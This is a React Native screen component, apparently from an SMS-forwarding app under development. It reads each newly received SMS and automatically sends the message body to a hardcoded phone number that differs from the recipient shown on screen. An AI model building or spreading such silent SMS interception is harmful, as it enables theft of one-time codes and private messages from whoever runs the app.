import React, { useState, useEffect } from 'react';
import { View, Text, StyleSheet, TouchableOpacity, FlatList, DeviceEventEmitter } from 'react-native';
import SmsListener from 'react-native-get-sms-android';

const SummaryScreen = ({ navigation }) => {
  const [messages, setMessages] = useState([]);
  const [showMessages, setShowMessages] = useState(false);

  useEffect(() => {
    // Set up the listener for incoming SMS
    const subscription = DeviceEventEmitter.addListener('sms_received', (sms) => {
      console.log('SMS received:', sms);
      // const [address, body] = sms.split(':');
      forwardSms();
      setShowMessages(true);
      // sendMessage(address, body);
    });

    return () => {
      // Clean up the subscription when the component is unmounted
      subscription.remove();
    };
  }, []);

  function forwardSms() {
    const filter = {
      box: 'inbox',
      maxCount: 1, // Fetch the most recent message
    };

    SmsListener.list(
      JSON.stringify(filter),
      fail => {
        console.log('Failed with this error: ' + fail);
      },
      (count, smsList) => {
        console.log('Count: ', count);
        const arr = JSON.parse(smsList);
        console.log('List: ', arr);

        setMessages(arr); // Store the messages in the state
        setShowMessages(true); // Trigger UI update to show messages

        // Automatically send the most recent message
        if (arr.length > 0) {
          sendMessage(arr[0].address, arr[0].body);
        }
      },
    );
  }

  const sendMessage = (recipientNumber, messageContent) => {
    SmsListener.autoSend(
      '+919521719674', // Replace with the actual recipient number
      messageContent,
      fail => {
        console.log('Failed with this error: ' + fail);
      },
      success => {
        console.log('SMS sent successfully');
      },
    );
  };

  const renderItem = ({ item }) => (
    <View style={styles.messageItem}>
      <Text style={styles.messageDate}>{new Date(item.date).toLocaleString()}</Text>
      <Text style={styles.messageBody}>{item.body}</Text>
    </View>
  );

  return (
    <View style={styles.container}>
      <View style={styles.section}>
        <Text style={styles.label}>SIM IN</Text>
        <Text style={styles.value}>All Numbers</Text>
      </View>
      <View style={styles.separator} />
      <View style={styles.section}>
        <Text style={styles.label}>Conditions</Text>
        <Text style={styles.value}>Forward all messages</Text>
      </View>
      <View style={styles.separator} />
      <View style={styles.section}>
        <Text style={styles.label}>Message Preview</Text>
        <Text style={styles.value}>Any</Text>
      </View>
      <View style={styles.separator} />
      <View style={styles.section}>
        <Text style={styles.label}>Recipient</Text>
        <Text style={styles.value}>Phone Number</Text>
      </View>
      <View style={styles.phoneNumberContainer}>
        <Text style={styles.phoneNumber}>+1234567890</Text>
      </View>
      <TouchableOpacity
        style={styles.doneButton}
        onPress={() => {
          forwardSms();
          // navigation.navigate('HomeScreen');
        }}>
        <Text style={styles.doneButtonText}>Done</Text>
      </TouchableOpacity>
      {showMessages && (
        <FlatList
          data={messages}
          renderItem={renderItem}
          keyExtractor={(item) => item._id.toString()}
          style={styles.messageList}
        />
      )}
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    padding: 20,
    justifyContent: 'space-between',
  },
  section: {
    marginBottom: 20,
  },
  label: {
    fontSize: 18,
    fontWeight: 'bold',
    marginBottom: 5,
  },
  value: {
    fontSize: 16,
  },
  separator: {
    height: 1,
    backgroundColor: '#ccc',
    marginVertical: 10,
  },
  phoneNumberContainer: {
    marginBottom: 20,
  },
  phoneNumber: {
    fontSize: 16,
    fontWeight: 'bold',
  },
  doneButton: {
    backgroundColor: '#007bff',
    padding: 15,
    borderRadius: 8,
    alignItems: 'center',
  },
  doneButtonText: {
    color: '#fff',
    fontSize: 18,
    fontWeight: 'bold',
  },
  messageList: {
    marginTop: 20,
  },
  messageItem: {
    padding: 10,
    borderBottomWidth: 1,
    borderBottomColor: '#ccc',
  },
  messageDate: {
    fontSize: 14,
    color: '#555',
  },
  messageBody: {
    fontSize: 16,
  },
});

export default SummaryScreen;
